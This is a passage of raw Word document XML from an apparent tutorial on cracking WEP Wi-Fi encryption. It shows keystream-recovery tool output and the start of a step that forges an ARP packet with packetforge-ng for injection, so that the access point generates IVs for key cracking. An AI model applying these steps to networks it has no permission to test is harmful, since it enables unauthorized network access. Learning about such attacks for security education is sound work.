          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>2873  ....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>j.....%.[.(s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76795600"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0x0040:  16d4 43fb </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>aebb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3ea1 7101 729e 65ca </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>6905  ..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>C...&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>q.r.e.i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E53BE2"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0x0050:  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>cfeb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4a72 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>be46                           ..</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Jr.F</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="20370693"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p>
    <w:p w14:paraId="7A03F517"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Use this </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packet ?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="04DE5C55" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="0038547B" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>You respond “y” above and the system continues.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6188EEC9"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Saving chosen packet in replay_src-0201-191639.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3D80EA"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
    <w:p w14:paraId="1B87806E"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Offset   85 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>( 0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">% done) | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = D3 | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>pt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 95 |  253 frames written in   760ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3856B342"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Offset   46 (75% done) | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 51 | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>pt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = F4 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>|  253</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> frames </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7127C6C3"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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>written</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> in   695ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E01143D"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Offset   36 (94% done) | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 83 | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>pt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 00 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>|   19</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> frames written in    58ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A722321"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Offset   35 (96% done) | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 4E | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>pt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 06 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>|  230</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> frames written in   689ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BA80F3"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Sent 957 packets, current guess: B9...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F1F3EC"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
    <w:p w14:paraId="05277224"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The AP appears to drop packets shorter than 35 bytes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5552748B"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Enabling standard workaround: ARP header re-creation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574DCB71"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E828ACF"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Saving plaintext in replay_dec-0201-191706.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51142275" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="0038547B" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Saving </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> in replay_dec-0201-191706.xor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7AB4A1" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A703AF6" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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Completed in 21s (2.29 bytes/s)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E92CB3B" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00204ED2" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00204ED2">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Success! The file “replay_dec-0201-191706.xor” above can then be used in the next step to generate an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00204ED2">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00204ED2">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008B6470" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E98D388" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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4 - Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>packetforge-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to create an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F8071C"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In the previous step, we obtained PRGA. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>It does not matter which attack generated the PRGA</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>both are equal</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. This PRGA is stored in the files ending with “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">”. We can then use this PRGA to generate a packet for injection. We will be generating an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet for injection. The objective is to have the access point rebroadcast the injected </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet. When it rebroadcasts it, a new IV is obtained. All these new IVs will ultimately be used to crack the WEP key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1135A88C"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But first, lets generate the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet for injection by entering:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528FC180" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFF1FA4" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008E353E" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>packetforge</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
